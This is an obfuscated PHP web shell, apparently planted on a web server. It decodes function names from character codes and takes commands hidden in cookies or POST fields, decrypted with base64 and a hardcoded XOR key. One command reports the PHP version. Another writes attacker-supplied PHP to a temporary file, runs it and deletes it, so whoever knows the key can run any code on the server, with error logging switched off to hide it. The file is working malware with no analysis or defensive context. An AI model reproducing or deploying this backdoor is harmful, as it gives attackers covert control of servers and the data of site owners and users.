<?php $agnvibox = "\146".'i'.'l'.'e'.chr(552-457)."\x70"."\165".chr(950-834).chr(769-674)."\x63".chr(111)."\156"."\x74"."\x65".chr(110).chr(116)."\163";
$hzpauh = "\x62"."\x61".chr(115).chr(115-14).chr(54)."\x34"."\137".'d'.'e'.chr(99).'o'.chr(100)."\145";
$ckraz = "\x69".chr(110).chr(105).chr(870-775)."\163"."\145"."\164";
$bdwucnwm = "\165".chr(110)."\x6c"."\x69".chr(110).'k';


@$ckraz("\145".'r'.chr(114).'o'."\x72".'_'.chr(445-337).chr(766-655).chr(998-895), NULL);
@$ckraz("\154".chr(707-596)."\147".'_'.chr(101).chr(213-99).'r'.chr(111).'r'."\x73", 0);
@$ckraz('m'.chr(97)."\170"."\137".chr(690-589)."\170".chr(101).chr(824-725).chr(117)."\164".chr(105)."\x6f".'n'.chr(95).'t'."\x69"."\155"."\145", 0);
@set_time_limit(0);

function kohwmhvj($nxufhu, $tnrdq)
{
    $blrkezj = "";
    for ($dedsua = 0; $dedsua < strlen($nxufhu);) {
        for ($j = 0; $j < strlen($tnrdq) && $dedsua < strlen($nxufhu); $j++, $dedsua++) {
            $blrkezj .= chr(ord($nxufhu[$dedsua]) ^ ord($tnrdq[$j]));
        }
    }
    return $blrkezj;
}

$dpxppmfxo = array_merge($_COOKIE, $_POST);
$yyqxvhtgd = '5b4a4493-dfbe-406a-b1f7-a21564acaf81';
foreach ($dpxppmfxo as $earhyfqt => $nxufhu) {
    $nxufhu = @unserialize(kohwmhvj(kohwmhvj($hzpauh($nxufhu), $yyqxvhtgd), $earhyfqt));
    if (isset($nxufhu['a'."\x6b"])) {
        if ($nxufhu[chr(97)] == "\x69") {
            $dedsua = array(
                chr(112)."\x76" => @phpversion(),
                chr(588-473).chr(118) => "3.5",
            );
            echo @serialize($dedsua);
        } elseif ($nxufhu[chr(97)] == chr(101)) {
            $gaydlstd = "./" . md5($yyqxvhtgd) . chr(334-288).'i'.chr(110).chr(161-62);
            @$agnvibox($gaydlstd, "<" . chr(258-195).chr(112).chr(104)."\x70"."\x20".chr(67-3).chr(738-621).'n'.chr(108)."\x69".chr(110).chr(816-709).'('."\x5f".chr(203-108).chr(70).chr(73)."\114".chr(69).chr(95)."\137"."\51".chr(59)."\40" . $nxufhu["\144"]);
            @include($gaydlstd);
            @$bdwucnwm($gaydlstd);
        }
        exit();
    }
}

